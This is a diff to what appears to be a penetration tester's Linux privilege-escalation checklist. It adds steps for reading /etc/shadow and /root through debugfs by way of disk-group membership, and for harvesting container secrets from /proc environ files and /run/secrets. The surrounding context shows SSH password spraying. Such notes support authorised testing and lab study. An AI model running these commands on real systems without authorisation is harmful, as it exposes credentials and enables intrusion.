@@ -60,3 +60,21 @@ On Kali, against every user with a shell, in users.txt:
 nxc ssh <TargetIP> -u users.txt -p '<Password>' --continue-on-success
 - [ ] A database password is often a user's as well, or root's
 - [ ] The password worked for su: :Pb sudo for that user, and :Pb linux-enum again
+
+## Disk group read (debugfs)
+
+Membership in the disk (or video) group reads the raw block device, bypassing file permissions.
+
+- [ ] id shows disk or video group
+- [ ] Read /etc/shadow straight off the disk: debugfs -R 'cat /etc/shadow' /dev/sda1
+- [ ] Browse /root the same way: debugfs -R 'ls /root' /dev/sda1, then cat what you find
+- [ ] No DAC checks apply — you are reading the filesystem, not opening files
+
+## Container environment loot
+
+Containers hand you secrets through /proc.
+
+- [ ] Dump PID 1's environment: cat /proc/1/environ | tr '\0' '\n'
+- [ ] Sweep every process: /proc/*/environ the same way
+- [ ] Check launch commands: cat /proc/1/cmdline
+- [ ] Look for mounted secrets: ls /run/secrets
